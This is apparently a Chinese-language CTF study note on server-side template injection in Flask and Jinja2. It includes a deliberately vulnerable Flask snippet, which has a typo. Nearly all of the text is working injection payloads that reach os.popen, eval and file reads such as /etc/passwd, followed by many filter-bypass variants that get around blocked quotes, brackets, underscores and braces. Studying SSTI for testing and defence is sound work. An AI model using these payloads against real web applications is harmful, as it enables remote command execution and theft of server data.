# SSTI模板注入

参考文章：[Python SSTI漏洞学习总结 - Tuzkizki - 博客园 (cnblogs.com)](https://www.cnblogs.com/tuzkizki/p/15394415.html)

SSTI Server Side Template Injection 服务器端模板注入

Python语言 Jinja模板下的注入



各语言框架SSTI

| 语言   | 框架                                  |
| ------ | ------------------------------------- |
| PHP    | smarty、twig                          |
| Python | jinja2、mako、tornad、django          |
| java   | Thymeleaf、jade、velocity、FreeMarker |



重点在flask后端中的jinja2模板注入



最简：

```py
from flask import Flask,request,render_template_string
from jinja2 import Template
app=Flask(__name__)

@app.route('/')
def index():
    name = requeset.args.get('name',default='jiangxiao')
    t = '''
    	<html>
    		<h1>Hello %s</h1>
    	</html>
    ''' %(name)
    return render_template_string(t)

app.run()
```



## jinja2

{{}}将花括号内的内容作为表达式执行并返回对应结果

{%s%s}用于声明变量或条件/循环语句

```
# 使用set声明变量
{% set s = 'Tuzk1' %}
# 条件语句
{% if var is true %}Tuzk1{%endif%}
# 循环语句
{% for i in range(3) %}Tuzk1{%endfor%}
```



基础姿势

```
?name={{2*3}}
```



```
{{%s}}
```



Mako

```
${%s}
```



Tornado

```
{{%s}}
```



Django

```
{{}}
```





## ==漏洞利用==



1. 查看哪些类可以使用

```
{{''.__class__.__base__.__subclasses__()}}
```



2. 找利用类索引，就是找os_wrap_close这个函数的索引是啥，那后面写的就是啥

```
<class 'os._wrap_close'>
```



3. 找利用类方法(不一定是133，所以要去尝试一下)

```
{{''.__class__.__base__.__subclasses__()[133].__init__.__globals__}}
```



4. 构造利用方法，popen直接弹出服务器的计算器calc

```
{{''.__class__.__base__.__subclasses__()[133].__init__.__globals__.popen('calc')}}
```



```
{{''.__class__.__base__.__subclasses__()[133].__init__.__globals__.popen('cat /flag').read()}}
```



或者另外一种形式

上下两个是等价的，看具体绕过

```
{{[].__class__.__base__.__subclasses__()[133].__init__.__globals__['popen']('calc')}}
```



上面从根源上去调用



下面还有其他引用方式



- 使用config,从当前项目中调用

```
{{config.__class__.__init__.__globals__['os'].popen('calc')}}
```



- 使用url_for

```
{{url_for.__globals__.os.popen('calc')}}
```



- 使用lipsum

```
{{lipsum.__globals__['os'].popen('calc')}}
```



- 使用get_flashed_messages

```
{{get_flashed_messages.__globals__['os'].popen('calc')}}
```



```
{{config}}
{{request.environ}}
```



### ==RCE==

```py
# 利用warnings.catch_warnings配合__builtins__得到eval函数，直接梭哈（常用）
{{[].__class__.__base__.__subclasses__()[138].__init__.__globals__['__builtins__'].eval("__import__('os').popen('whoami').read()}}

# 利用os._wrap_close类所属空间下可用的popen函数进行RCE的payload
{{"".__class__.__base__.__subclasses__()[128].__init__.__globals__.popen('whoami').read()}}
{{"".__class__.__base__.__subclasses__()[128].__init__.__globals__['popen']('whoami').read()}}

# 利用subprocess.Popen类进行RCE的payload
{{''.__class__.__base__.__subclasses__()[479]('whoami',shell=True,stdout=-1).communicate()[0].strip()}}

# 利用__import__导入os模块进行利用
{{"".__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__import__('os').popen('whoami').read()}}

# 利用linecache类所属空间下可用的os模块进行RCE的payload，假设linecache为第250个子类
{{"".__class__.__bases__[0].__subclasses__()[250].__init__.__globals__['os'].popen('whoami').read()}}
{{[].__class__.__base__.__subclasses__()[250].__init__.func_globals['linecache'].__dict__.['os'].popen('whoami').read()}}

# 利用file类（python3将file类删除了，因此只有python2可用）进行文件读
{{[].__class__.__base__.__subclasses__()[40]('etc/passwd').read()}}
{{[].__class__.__base__.__subclasses__()[40]('etc/passwd').readlines()}}
# 利用file类进行文件写（python2的str类型不直接从属于属于基类，所以要两次 .__bases__）
{{"".__class__.__bases[0]__.__bases__[0].__subclasses__()[40]('/tmp').write('test')}}

# 通用getshell，都是通过__builtins__调用eval进行代码执行
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('whoami').read()") }}{% endif %}{% endfor %}
# 读写文件，通过__builtins__调用open进行文件读写
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('filename', 'r').read() }}{% endif %}{% endfor %}
```



## 绕过姿势

### 过滤了单引号'

内置函数进行参数逃逸

```
{{[].__class__.__base__.__subclasses__()[132].__init__.__globals__[request.args.x](request.args.y).read()}}&x=popen&y=cat /flag
```



request绕过

```
# request.values
{{"".__class__.__bases__.__getitem__(0).__subclasses__().pop(128).__init__.__globals__.popen(request.values.rce).read()}}&rce=cat /flag
# request.cookies
{{"".__class__.__bases__.__getitem__(0).__subclasses__().pop(128).__init__.__globals__.popen(request.cookies.rce).read()}}
Cookie: rce=cat /flag;
# 还有request.headers、request.args，这里不作演示
```



chr函数绕过

```
{% set chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %}
# %2b是+的url转义
{{ ().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(chr(47)%2bchr(101)%2bchr(116)%2bchr(99)%2bchr(47)%2bchr(112)%2bchr(97)%2bchr(115)%2bchr(115)%2bchr(119)%2bchr(100)).read()}}
```





### 过滤了args关键字

直接使用另外一种方法request.values.x即可

```
{{[].__class__.__base__.__subclasses__()[132].__init__.__globals__[request.values.x](request.values.y).read()}}&x=popen&y=cat /flag
```

 

### 过滤中括号

```
{{url_for.__globals__.os.popen('cat /flag').read()}}
```



```
# 原payload，可以使用__base__绕过__bases__[0]
"".__class__.__bases__[0].__subclasses__()[128].__init__.__globals__.popen('whoami').read()
# 通过__getitem__()绕过__bases__[0]、通过pop(128)绕过__subclasses__()[128]
"".__class__.__bases__.__getitem__(0).__subclasses__().pop(128).__init__.__globals__.popen('whoami').read()

# 原payload
[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('whoami').read()")
# 绕过
[].__class__.__base__.__subclasses__().__getitem__(59).__init__.__globals__.__builtins__.eval("__import__('os').popen('whoami').read()")
```



### 过滤中括号和单引号

```
{{url_for.__globals__.os.popen(request.values.x).read()}}&x=cat /flag
```



### 过滤下划线

```
{{(lipsum|attr(request.values.x)).os.popen(request.values.cmd).read()}}&x=__globals__&cmd=cat /flag
```



```py
# request妙用，绕过
{{''[request.args.a][request.args.b][2][request.args.c]()}}&a=__class__&b=__mro__&c=__subclasses__

# request传参绕过
# request.args
{{''[request.args.class][request.args.mro][2][request.args.subclasses]()[40]('/etc/passwd').read() }}&class=__class__&mro=__mro__&subclasses=__subclasses__

# request.cookies
{{''[request.args.class][request.args.mro][2][request.args.subclasses]()[40]('/etc/passwd').read() }}
Cookie: class=__class__; mro=__mro__; subclasses=__subclasses__;
# 还有request.headers、request.args
```





### 过滤关键字

拼接字符串

```
'o'+'s'
'sy' + 'stem'
'fl' + 'ag'
```

编码

大小写绕过

过滤config

```
# 绕过，同样可以获取到config
{{self.dict._TemplateReference__context.config}}
```



### 过滤双花括号

{% + print 绕过

```
{%print(''.__class__.__base__.__subclasses__()[138].__init__.__globals__.popen('whoami').read())%}
```



### ==字符串拼接绕过==

当有一种情况就是它去判断所有的关键字，都没办法用的情况下，尝试字符串拼接





1. 查看哪些类可以使用

```
{{''.__class__.__base__.__subclasses__()}}
```

```
{{()['__cla'+'ss__'].__base__['__subcl'+'asses__']()}}
```



2. 找利用类索引，就是找os_wrap_close这个函数的索引是啥，那后面写的就是啥

```
<class 'os._wrap_close'>
```



3. 找利用类方法(不一定是133，所以要去尝试一下)

```
{{''.__class__.__base__.__subclasses__()[133].__init__.__globals__}}
```

```
{{()['__cla'+'ss__'].__base__['__subcl'+'asses__']()[137]['__in'+'it__']['__glo'+'bals__']}}
```



4. 构造利用方法，popen直接弹出服务器的计算器calc

```
{{''.__class__.__base__.__subclasses__()[133].__init__.__globals__.popen('cat /flag').read()}}
```



```
{{()['__cla'+'ss__'].__base__['__subcl'+'asses__']()[137]['__in'+'it__']['__glo'+'bals__']['__bui'+'ltins__']['ev'+'al']("__im"+"port__('o'+'s').po"+"pen('ls /').read()")}}
```

```
{{()['__cla'+'ss__'].__base__['__subcl'+'asses__']()[137]['__in'+'it__']['__glo'+'bals__']['__bui'+'ltins__']['ev'+'al']("__im"+"port__('o'+'s').po"+"pen('cat /Th1s_is__F1114g').read()")}}
```



## 通用get shell-payload

### 过滤引号、中括号

```
{% set chr=().__class__.__bases__.__getitem__(0).__subclasses__().__getitem__(250).__init__.__globals__.__builtins__.chr %}{% for c in ().__class__.__base__.__subclasses__() %} {% if c.__name__==chr(95)%2bchr(119)%2bchr(114)%2bchr(97)%2bchr(112)%2bchr(95)%2bchr(99)%2bchr(108)%2bchr(111)%2bchr(115)%2bchr(101) %}{{ c.__init__.__globals__.popen(chr(119)%2bchr(104)%2bchr(111)%2bchr(97)%2bchr(109)%2bchr(105)).read() }}{% endif %}{% endfor %}
```





### 过滤引号、中括号、下划线

```
# 使用getlist，获取request的__class__
{{request|attr(request.args.getlist(request.args.l)|join)}}&l=a&a=_&a=_&a=class&a=_&a=_
# 拆解一下，等价于下列payload
{{request|attr('__class__')}}
{{request['__class__']}}
{{request.__class__}}

# 获取__object__
{{request|attr(request.args.getlist(request.args.l1)|join)|attr(request.args.getlist(request.args.l2)|join)|attr(request.args.getlist(request.args.l2)|join)|attr(request.args.getlist(request.args.l2)|join)}}&l1=a&a=_&a=_&a=class&a=_&a=_&l2=b&b=_&b=_&b=base&b=_&b=_
# 通过flask类获取会更快
{{flask|attr(request.args.getlist(request.args.l1)|join)|attr(request.args.getlist(request.args.l2)|join)}}&l1=a&a=_&a=_&a=class&a=_&a=_&l2=b&b=_&b=_&b=base&b=_&b=_
```



### 过滤引号、中括号、下划线、花括号

```
# 打印子类并找到可以利用的类
{%print(flask|attr(request.args.getlist(request.args.l1)|join)|attr(request.args.getlist(request.args.l2)|join)|attr(request.args.getlist(request.args.l3)|join)())%}&l1=a&a=_&a=_&a=class&a=_&a=_&l2=b&b=_&b=_&b=base&b=_&b=_&l3=c&c=_&c=_&c=subclasses&c=_&c=_

# 然后稍微加一点难度
# 目录-寻找可利用类 中用到的脚本跑一下，得到os._wrap_close的序号为138（这里用这个类来演示），于是：
{%print(flask|attr(request.args.getlist(request.args.l1)|join)|attr(request.args.getlist(request.args.l2)|join)|attr(request.args.getlist(request.args.l3)|join)()|attr(request.args.getlist(request.args.l4)|join)(138)|attr(request.args.getlist(request.args.l5)|join)|attr(request.args.getlist(request.args.l6)|join)).popen(request.args.rce).read()%}&l1=a&a=_&a=_&a=class&a=_&a=_&l2=b&b=_&b=_&b=base&b=_&b=_&l3=c&c=_&c=_&c=subclasses&c=_&c=_&l4=d&d=_&d=_&d=getitem&d=_&d=_&l5=e&e=_&e=_&e=init&e=_&e=_&l6=f&f=_&f=_&f=globals&f=_&f=_&rce=whoami
# 等价于
{{''.__class__.__base__.__subclasses__()[138].__init__.__globals__.popen('whoami').read()}}
```

